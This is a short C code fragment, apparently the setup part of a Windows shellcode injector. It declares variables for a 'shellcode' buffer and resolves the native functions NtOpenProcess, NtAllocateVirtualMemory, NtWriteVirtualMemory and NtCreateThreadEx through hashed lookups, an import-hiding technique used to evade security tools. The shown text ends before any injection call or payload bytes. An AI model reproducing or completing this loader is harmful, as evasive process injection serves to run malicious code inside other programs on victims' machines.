	HANDLE hProc = NULL;
	PVOID remoteAddr = 0;
	HANDLE hThread = NULL;
	NTSTATUS status = NULL;
	SIZE_T bytesWritten = 0;
	CLIENT_ID clientId = { 0 };
	SIZE_T sizeSc = sizeof(shellcode);
	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
	HMODULE hMod = GetMH(0x4898F593);
	NtOpenProcess ntOpenProcess = (NtOpenProcess)GetPA(hMod, 0x616BCD2B);
	NtAllocateVirtualMemory ntAlloc = (NtAllocateVirtualMemory)GetPA(hMod, 0xB4983C2F);
	NtWriteVirtualMemory ntWrite = (NtWriteVirtualMemory)GetPA(hMod, 0x92A7F011);
	NtCreateThreadEx ntCrThreadX = (NtCreateThreadEx)GetPA(hMod, 0x3C2D6449);
